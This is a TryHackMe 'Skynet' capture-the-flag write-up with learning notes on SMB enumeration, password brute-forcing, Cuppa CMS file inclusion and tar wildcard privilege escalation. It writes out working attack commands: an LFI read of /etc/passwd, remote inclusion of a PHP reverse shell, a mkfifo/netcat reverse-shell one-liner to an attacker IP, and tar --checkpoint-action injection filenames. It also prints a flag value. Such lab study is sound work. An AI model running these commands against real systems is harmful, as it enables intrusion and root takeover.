# Skynet \(L\) \(wlk\)

_TryHackMe_ - [**Skynet**](https://tryhackme.com/room/skynet) Write-Up

_topics_: vuln scanning, public exploits, web exploitation, samba, password cracking, insecure cronjobs

## 1\) Plan

* no information is known about this machine, we must find 'Miles' password for the first task. We are told to enumerate Samba and get the password for Miles' emails

## 2\) Enum 

`nmap -vvv`: lists 6 open ports

* 22/tcp ssh
* 80/tcp http
* 110/tcp pop3
* **139/tcp netbios-ssn** \(network BIOS service session: lets two computers establish a connection, allows messages to span multiple packets, and provides error detection and recovery\)
* 143/tcp imap
* **445/tcp microsoft-ds** \(used as Windows NetBIOS port for all versions after NT, port 445 is SMB over IP, SMB is known as Samba and stands for Server Message Blocks and used for file sharing\)
  * OS version: Linux 3.10 - 3.13
  * Samba 4.3.11 Ubuntu
  * likely vulnerable to **CVE-2007-6750**, The Apache HTTP Server 1.x and 2.x, Slowloris Denial of Service attack. Tries to keep many connections on the target web server open as long as possible by opening connections and sending partial requests to starve the http server resources.

### 2.1\) Enum Samba

* CVE says Apache is vulnerable to DOS attack but that will not help in this scenario because we need Miles' password andh hidden directories. We will search port 139 and port 445 as Samba is the software used for netbios and could potentially contain files and information
* `gobuster dir -u  -w` __ use dirbuster wordlist, returns 7 hidden directories, only /squirrelmail will allow access without root
* `smbmap -H -R` __: lists Samba shares on server, Samba shares are apart of the client-server approach where **shares are used to faciliate communication between processes and computers over SMB**
* `nmap -p445 --script=smb-enum-shares.nse,smb-enum-users.nse` also returns number of shares as well as `enum4linux -S` 
* returns 2 unique shares /milesdyson \(C:\home\milesdyson\share\) and /anonymous \(C:\srv\samba\) which has READ/WRITE access
  * `smbclient //ip/share`: installed on most Linux machines, used to inspect smb shares
* `smbget -R smb://ip/anonymous` to retrieve files recursively for inspection
  * TASK IS TO GET MILES' PASSWORD. mousepad attention.txt shows a message from Miles that all employees need to change password after seeing this message
  * after searching through the log files, log1.txt reaveals a list of potential passwords
  * BURP: set firefox proxy to 127.0.0.1:8080 and attempt to login with the **correct username "milesdyson"** and random password to get the POST data. Send POST request data to Intruder and start Sniper attack with the log1.txt as paylaod. verify the abnormal length field which will be the **correct password.** **QUESTION 1**
  * using correct password login to squirrelmail, it shows the password for his SMB share
  * login to miles share `smbclient //ip/milesdyson -U "milesdyson"` the U specifies the user login \(had this issue\)
* smbget to get the files shows the important.txt file including the hidden directory /45kra24zxs28v3yd \(his personal website\)

## 3\) Exploitation \(Local Privilege Escalation\) 

#### **What is the vulnerability called when you can include a remote file for malicious purposes?**

* **Remote File Inclusion**: is an attack targeting vulnerabilities in web applications that dynamically reference external scripts, goal is to exploit the referencing function in an application to upload malware \(e.g., backdoor shells\) from a remote URL located within a different domain. Local is from the same web server.
* important.txt mentions to add features to beta CMS on personal website \(its a hidden directory, see what else is hiding on there\)

  Searching the hidden directory with `python3 dirsearch.py -u http://10.10.179.254/45kra24zxs28v3yd -w /usr/share/dirb/wordlists/common.txt -t 200 -r -e txt,php,html` _``_gives another subdirectory of administrator and /administrator/alerts

  * We must now find a link between local/remote file inclusion and the administrator subdirectory.
    * going to the /administrator subdomain reveals it is run by Cuppa CMS, this is relevant as searching for cuppa cms exploits reveals **Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion** or PHP Code Injection. Also revealed in searchsploit _searchsploit cuppa_ 
    * navigating to [http://10.10.179.254/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php](http://10.10.179.254/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php) reveals the source code that contains the vulnerability. **&lt;?php include\($\_REQUEST\["urlConfig"\]\); ?&gt;** it includes files on line 22

{% hint style="info" %}


_**\***_- what does milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash mean? how is he confirming that LFI works with this with this command `curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://10.10.179.254/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?`

* \*\*--data-urlencode is necessary because URLs are sent in ASCII and must be converted.

  It begins with a name \(provided from ex-db\) followed by a separator and content specification \(the users file\) --data-urlencode name=content.

* it tries to request the contents of /etc/passwd from the site, which contain the users of the system.
* it uses ../../../ 9 times because it is used to manipulate file paths within the server. THIS CLARIFIES IT WORKS because it's a directory traversal vulnerability that allows us to read files of any type, including those outside the web root directory as shown on ex-db.
* The syntax username:x:uid:gid:text name:home directory:login shell means just that, it is to return Miles Dyson username and confirm that we can receive and transmit URLs per the line 22. PHP Code will be executed while non-PHP code \(user file\) is embedded to output, like what we got when we requested the user file\*\* 
* what does entirety of `curl http://10.10.179.254/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.68.31:8080/php-reverse-shell.php` mean? : **transferring URL information with a HTTP GET request that carries out using the syntax of exploit 25971. it is the means \(attack vector\) by which the reverse shell is passed to the server**

  _**\*\***_- check CMS version?

* Get a reverse shell script and change the IP to eth0, host it locally using Python, use netcat to listen for a session and then remotely include this shell on the webserver.
  * `python -m SimpleHTTPServer 8080` check version for syntax, navigate to /8080
  * `nc -lvnp` __ 
  * `curl http://10.10.201.44/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.171.176:8080/php-reverse-shell.php` sends GET request using the php shell
    * downloaded shell from [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and edit for eth0 ip and desired port

User flag: 7ce5c2109a40f958099283600a9ae807 found in cat /home/milesdyson/user.txt

* **what is tty?**: tty command of terminal prints the file name of the terminal connected to standard input. tty is short of teletype, but known as a terminal it allows you to interact with the system by passing on the data \(you input\) to the system, and displaying the output produced by the system. Linux terminal uses a virtual teletype, called a pseudo-teletype \(PTS\) ,which handles the connections from all of the terminal windows. The multiplexor is the master, and the PTS are the slaves. The multiplexor is addressed by the kernel through the device file located at /dev/ptmx. The tty command will print the name of the device file that your pseudo-teletype slave is using to interface to the master. And that, effectively, is the number of your terminal window. a Teleype is an I/O device, allows messages to be typed, encoded, sent, received, decoded and printed
* **what is pipe/named pipe files**:
* **what is fifo**: fifo means first in, first out, meaning the order of bytes going in is equal to those going out, it's a named pipe. It is accessed as part of the filesystem. When processes exchange data via fifo, the kernel passes all data internally without writing to the filesystem. The name of a named pipe is the file name within the file system.
{% endhint %}

## 4\) Root Exploitation/Post-Exploitation

####  \(Root Privilege Escalation\) \(page 312 & 566 of pwk20\) Must obtain root flag

* how to get tools \(pspy64 or LinEnum\) on target to check for privesc?: `mkdir /tmp/privesc && wget -nd -np -R "index.html" -P /tmp/privesc --recursive http://10.10.171.176:8080/thinclient_drives/shareFol/`
  * `wget -nd -np -R "index.html -P /tmp/privesc --recursive` __: 

    after uploading the privesc script to the attacking machine's server \(chmod 700 or chmod u+x after, said to copy to home directory but wasnt necessary on this machine\)

  * `./pspy64 -pf >> /tmp/privesc/mouse.txt`
    * pf command: prints both command and file system events to stdout
  * to send it back to attacker to not view in terminal: directory path traversal with command `curl -s --data-urlencode urlConfig=../../../../../../../../../tmp/privesc/mouse.txt http://10.10.201.44/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php? >> read.txt`
* pspy64 returns a list of logs/cron jobs \(schedules tasks by time\), specifically _/usr/sbin/CRON -f_ \(sbin is admin exe\) which is run every minute by UID=0 \(root\) and /etc/crontab which payloadallthings recommends be enumerated if we have permission to write to these files \(we do\), it is recommended to **check inside the file if there are other paths with write permissions**
  * checking the contents of /etc/crontab and pspy64 reveal the bash script /home/milesdyson/backups/backup.sh is being called every minute \(and ran as root\), as well as calling the default system shell /bin/sh -c while reading the backups file. Listing the contents of the file reveal that it gets a shell, navigates to /var/www/html and makes a backup of everything in the directory using the tar cf  \* command, all in chronological order every minute. 

#### CRONJOBS: it is likely they will run as another user, so if you can influence the execution then you can run things as the user

* googling tar privilege escalation reveals there exists a vulerability in the tar cf  _command that leads to arbitrary code injection as root, enabling us to send a reverse shell on the compromised machine. The asterik_  symbol in Unix OS is considered a **"wildcard"** \(or meta character\) a symbol or set of symbols that represent other characters, usually used in ls or rm commands given a criteria. There are various security related issues that come with Unix wildcards, by using specially crafted filenames the attacker can inject arbitrary arguments to shell commands, including root.
* the issue arises when the attacker creates fake files with touch and a shell script with any command \(i.e sending a shell\). the tar binary has two options that can be used for poisoning, **--checkpoint\[=NUMBER\]** \(display progress messages every n record, default is 10\) and **--checkpoint-action=ACTION** \(execute ACTION on each checkpoint\). By using tar with these options, a specific action can be used after each checkpoint \(including malicious scripts for ACE under the user who starts tar\). the command tar cf   _seems benign but the issue is when the user creates a couple of fake files and a shell script that contains any random command. \*\*By using the_  wildcard in the tar command, the files are passed options to the tar binary and shell.sh is executed as root.\*\*

  Creating a reverse shell to send to the target machine to be run as root. **\(read page 567 Insecure File permissions Cron Case Study\)**

  * navigate to /var/www/html
  * `touch shell.sh`: makes a bash script named shell \(its contents are empty\)
  * `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.171.176 4444 > /tmp/f" > shell.sh`: here the shell and netcat are redirecting to each other in a loop, it is taking advantage of I/O redirection and shell interactive mode \(on by default when on a TTY\). The stdout of nc is copied to /tmp/f, meaning whatever it receives from the attacking machine \(a shell\) over the network goes there. Shell reads commands from fifo and sends commands over the network via pipe to nc. The commands sent from remote to local shell are written by nc to the fifo, keeping the loop.
  * if previous command fails ; indicates the second will still run, when && is used the second command will not run. When &gt; is used over &gt;&gt; then the file already exists \(touch  if nonexisistent\). pipe \| symbol means the output of the first command is input of second command.
    * `echo "" > shell.sh`: saves whatever is in quotations to the file shell.sh
    * `rm /tmp/f:` removes the fifo file
    * `mkfifo /tmp/f`: remakes the fifo file
    * `cat /tmp/f`: prints the contents of the fifo file /tmp/f. Necessary because the shell cant use stdout to print the output since it needs to send the shell to nc. This is used to print whatever command is issued from the attacker \(i.e the shell\)
    * `/bin/sh -i 2>&1`: invokes the interactive bash shell \(-i\), 2&gt;&1 means the stdout and stderr \(stderr = 2\) are redirected to command \(nc\). This command cannont use stdout to print the output or stdin. \(nc for out and cat for in\)
    * `nc 10.10.171.176 4444 > /tmp/f`: stdout of nc is copied to /tmp/f \(whatever is sent over the network goes here, aka the shell to be run as root\). We use tmp because any program can run and unprivileged users can run programs to elevate their user access. Anything written to the fifo is printed by cat, since the output of cat is the input of /bin/sh, /bin/sh executes and sends the output to nc, which is sent to the attacking machine. 
  * `touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"`: apart of tar binary and arbitrary command execution. This option in the binary executes ACTION on each checkpoint. the action is the command sh \(tool to run programtexecute string, input or file\) shell.sh. it runs the bash script through sh which is the language interpreter in the specified language \(aka bash shell in bash script\)
  * `touch "/var/www/html/--checkpoint=1"`: display progress messages every nth record 
  * \(on attacker\) `nc -lvnp 4444`
  * `cd /root && cat root.txt`

